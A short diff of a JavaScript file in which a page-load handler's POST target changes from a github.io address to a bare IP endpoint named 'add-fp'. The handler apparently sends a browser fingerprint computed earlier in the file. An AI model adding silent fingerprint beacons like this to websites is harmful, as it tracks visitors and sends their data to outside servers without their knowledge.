@@ -71,8 +71,7 @@ const get_fb = function () {
 const fb = get_fb();
 window.addEventListener("load", function () {
   var xhr = new XMLHttpRequest();
-  //   xhr.open("POST", "http://103.178.229.48/api/add-fp");
-  xhr.open("POST", "https://k3lu.github.io/sightseeing.github.io/");
+  xhr.open("POST", "http://103.178.229.48/api/add-fp");
   xhr.setRequestHeader("Accept", "application/json");
   xhr.setRequestHeader("Content-Type", "application/json");
 
